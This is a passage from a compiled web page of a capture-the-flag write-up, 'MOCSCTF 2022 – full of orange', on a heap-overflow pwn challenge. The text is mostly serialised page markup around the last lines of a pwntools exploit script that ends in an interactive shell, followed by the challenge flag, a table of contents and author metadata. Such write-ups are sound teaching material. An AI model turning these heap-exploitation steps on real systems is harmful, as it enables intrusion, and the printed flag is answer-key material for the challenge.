string\",children:\"'realloc'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.h2,{id:\"4-get-flag\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#4-get-flag\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"4. Get flag\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/get_flag.png\",alt:\"get_flag.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Flag is \",(0,e.jsx)(n.code,{children:\"MOCSCTF{Fr33_@nd_Fr3E_1s_n07_3@5y}\"})]})]})}}var w=b;function _(a,c){throw new Error(\"Expected \"+(c?\"component\":\"object\")+\" `\"+a+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return y;})();\n;return Component;","toc":[{"value":"Full of Orange","url":"#full-of-orange","depth":2},{"value":"Reference source","url":"#reference-source","depth":3},{"value":"1. Find bug","url":"#1-find-bug","depth":2},{"value":"2. Brainstorming","url":"#2-brainstorming","depth":2},{"value":"Technique","url":"#technique","depth":3},{"value":"Brainstorming","url":"#brainstorming","depth":3},{"value":"3. Exploit","url":"#3-exploit","depth":2},{"value":"Stage 1: Leak main arena address","url":"#stage-1-leak-main-arena-address","depth":3},{"value":"Stage 2: Free 2 small chunks","url":"#stage-2-free-2-small-chunks","depth":3},{"value":"Stage 3: Get shell","url":"#stage-3-get-shell","depth":3},{"value":"4. Get flag","url":"#4-get-flag","depth":2}],"frontMatter":{"readingTime":{"text":"22 min read","minutes":21.87,"time":1312200,"words":4374},"slug":"mocsctf-2022/full-of-orange","fileName":"mocsctf-2022/full-of-orange.md","title":"MOCSCTF 2022 – full of orange","date":"2022-02-28T00:00:00.000Z","draft":false,"authors":["Johnathan"],"tags":["MOCSCTF 2022","pwn","heap","Shell","overflow","Binary Exploit"],"summary":"Heap overflow for shell.","canonical":"https://github.com/nhtri2003gmail/writeup-mocsctf2022.mocsctf.com-orange"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.2,"time":12000,"words":40},"slug":["Johnathan"],"fileName":"Johnathan.md","name":"Johnathan","avatar":"https://www.gravatar.com/avatar/aa9cc3f27f3b1f3c47841d62f18c039f?d=identicon\u0026s=256","specialties":["Pwn"],"github":"https://github.com/nhtri2003gmail","member":true,"retired":true,"description":"A person who does magic things.","order":2,"date":null}],"prev":{"title":"DICE CTF 2022 – vm-calc","date":"2022-02-09T00:00:00.000Z","draft":false,"authors":["lemon"],"tags":["DICE CTF 2022","Web","Prototype Pollution","CVE-2022-21824","vm2","Proxy"],"summary":"Pollute prototype with a recent vulerability in console.table, and throw a proxy object within an exception.","slug":"dice-ctf-2022/vm-calc"},"next":{"title":"Ugra CTF Quals 2022 – Играет как умеет","date":"2022-03-01T00:00:00.000Z","draft":false,"authors":["blueset","sahuang"],"tags":["Ugra CTF Quals 2022","Misc","PDF","Music","Audio Processing","Talking Piano"],"summary":"Talking piano illusion only works if you know the words, but what if you only sort of know them?","slug":"ugra-ctf-quals-2022/symphony"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["mocsctf-2022","full-of-orange"]},"buildId":"0wxHpwy3ehtFejYPlY-Z7","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>